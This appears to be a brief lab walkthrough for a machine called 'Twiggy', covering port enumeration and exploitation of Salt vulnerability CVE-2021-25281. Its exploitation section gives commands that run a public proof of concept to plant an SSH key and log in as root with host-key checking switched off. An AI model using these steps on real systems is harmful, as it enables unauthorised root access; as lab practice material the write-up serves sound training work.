# Twiggy

## Enumeration
- Enumeration with Nmap shows various open ports, including two HTTP ones.
- Running Nuclei against those HTTP ports reveals host is vulnerable to Salt vulnerability CVE-2021-25281. 


## Exploitation
- Validate and understand vulnerability using Nuclei template documentation and Burp by sending POST request.
- Find POC to run against server. Edit POC URL query step to `http` instead of `https`.
- Deploy SSH keys on server:
``` sh
ssh-keygen -t ed25519

python3 cve-2021-25281.py 192.168.176.62:8000 ssh ../.ssh/id_ed25519.pub   

ssh -i ../.ssh/id_ed25519 root@192.168.176.62 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
```

## References
https://attackerkb.com/topics/PXoF3GfoLU/cve-2021-25281

https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-25281.yaml

https://docs.saltproject.io/en/3006/ref/wheel/all/index.html

https://github.com/Immersive-Labs-Sec/CVE-2021-25281
